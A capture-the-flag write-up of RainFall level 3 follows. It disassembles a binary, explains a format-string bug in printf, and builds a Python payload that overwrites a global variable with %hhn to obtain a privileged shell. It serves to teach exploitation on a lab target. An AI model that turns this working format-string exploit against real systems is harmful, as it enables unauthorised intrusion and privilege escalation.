# LEVEL 3

```asm
0804851a <main>:
 804851a:	55                   	push   ebp
 804851b:	89 e5                	mov    ebp,esp
 804851d:	83 e4 f0             	and    esp,0xfffffff0
 8048520:	e8 7f ff ff ff       	call   80484a4 <v>
 8048525:	c9                   	leave
 8048526:	c3                   	ret
```
The `main` function is only calling `v`, like in the preceding level.
```asm
080484a4 <v>:
 80484a4:	55                   	push   ebp
 80484a5:	89 e5                	mov    ebp,esp
 80484a7:	81 ec 18 02 00 00    	sub    esp,0x218
 80484ad:	a1 60 98 04 08       	mov    eax,ds:0x8049860
 80484b2:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80484b6:	c7 44 24 04 00 02 00 	mov    DWORD PTR [esp+0x4],0x200
 80484bd:	00
 80484be:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484c4:	89 04 24             	mov    DWORD PTR [esp],eax
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
```
The `v` function declares a 512 bytes buffer, plus space for function arguments. Its then getting 512 bytes
of user input from stdin, effectively filling the buffer, without overflowing.
```asm
 80484cc:	8d 85 f8 fd ff ff    	lea    eax,[ebp-0x208]
 80484d2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
 ```
The vulnerability lies in the fact that this string is passed as it is to `printf`, where it should be formatted
as a `"%s"`. This allow us to input any number of `%` formats and `printf` will interpret them as if they were
passed through the stack like normal arguments. This means, `[ebp + 0x4]` being the only valid argument, `printf`
will read the stack for us from below this (so `[ebp + 0x8]` first).   
There is a `printf` format, `%n` that permit us to write data, taking the variadic argument as an address,
and storing the amount of characters, as an int, already outputted by the current `printf` call at this address.   
There are variations of this format, `%hn` and `%hhn` that will respectively store a short (2 bytes) and a single 
byte. (i believe if `n` is for an 4 bytes, `hn` is for "half" of 4 bytes, and `hhn` "half-half", that's how i 
remember those).   
```asm
 80484da:	a1 8c 98 04 08       	mov    eax,ds:0x804988c
 80484df:	83 f8 40             	cmp    eax,0x40
 80484e2:	75 34                	jne    8048518 <v+0x74>
 ```
After printing, a global variable value is checked. If its not equal to 64, the function simply returns to the
main, terminating the execution. Otherwise, it executes `system("/bin/sh")`, giving us a priileged shell.
The goal will be to overwrite this variable (at address `0x0804988c`) with the value 64.
```bash
level3@RainFall:~$ echo "%8x %8x %8x %8x %8x %8x" | ./level3
     200 b7fd1ac0 b7ff37d0 20783825 20783825 20783825
```
We first exploit the format string to dump some stack values and find where our buffer is. The pattern
`20783825` is litterally "%8x " treated as an unsigned int in hexadecimal. So we need to get rid of 3 values
before being sure of using our own buffer as variadic arguments. (May sound a little bit weird but it will be clear)
If we place the global variable address at the start of our buffer, we can use it as a target for a `%hhn` and write
here. Now we have to make `printf` output 64 characters before writing. We can achieve the following by exhausting
the 3 values before the buffer using a `%Nx` format, `N` being a forced length for this format, padded with spaces.
Finally, we have `(global address: 4 bytes)%8x%8x%44x` that takes exactly 64 chars to be printed (4 + 8 + 8 + 44) and
then we can append `%n`, `%hn` or `%hhn` (the choice won't really matter since we are targeting an int address).
```python
GLOBAL_M = 0x0804988c

payload = b""
payload += p32(GLOBAL_M) + b"%8x%8x%44x%hhn"
```
